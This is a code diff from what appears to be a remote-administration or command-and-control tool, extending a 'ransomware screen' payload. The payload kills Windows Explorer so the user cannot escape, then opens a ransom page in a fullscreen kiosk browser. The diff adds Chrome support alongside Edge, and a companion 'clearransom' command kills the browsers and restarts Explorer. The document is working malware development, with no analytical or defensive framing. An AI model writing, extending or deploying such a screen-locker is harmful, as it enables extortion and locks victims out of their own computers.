@@ -316,17 +316,28 @@ import base64
 import subprocess
 import winreg
 
-def get_edge_path():
+def get_browser_path():
     paths = [
-        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\msedge.exe"),
-        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\msedge.exe")
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"),
+        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"),
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"),
+        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe")
     ]
     for root, key_path in paths:
         try:
             with winreg.OpenKey(root, key_path) as key:
                 return winreg.QueryValue(key, None)
-        except WindowsError:
+        except:
             continue
+    
+    common = [
+        r"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
+    ]
+    for p in common:
+        if os.path.exists(p): return p
     return "msedge.exe"
 
 html_content = {repr(ransom_html)}
@@ -339,10 +350,15 @@ with open(html_path, "w", encoding="utf-8") as f:
 # Kill explorer to prevent user from escaping easily
 subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-edge_path = get_edge_path()
-subprocess.Popen([edge_path, "--kiosk", f"file:///{{html_path}}", "--edge-kiosk-type=fullscreen", "--no-first-run", "--no-default-browser-check"], 
-                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-result = "Ransomware screen deployed successfully"
+browser_path = get_browser_path()
+is_chrome = "chrome.exe" in browser_path.lower()
+
+cmd = [browser_path, "--kiosk", f"file:///{{html_path}}", "--no-first-run", "--no-default-browser-check"]
+if not is_chrome:
+    cmd.append("--edge-kiosk-type=fullscreen")
+
+subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+result = f"Ransomware screen deployed successfully using {{browser_path}}"
 """
                     task_data = {'code': python_payload}
                 elif cmd_type == 'clearransom':
@@ -352,8 +368,9 @@ import os
 import subprocess
 import tempfile
 
-# Kill Edge browser
+# Kill browsers
 subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Restart Explorer
 subprocess.Popen(["explorer.exe"], start_new_session=True)
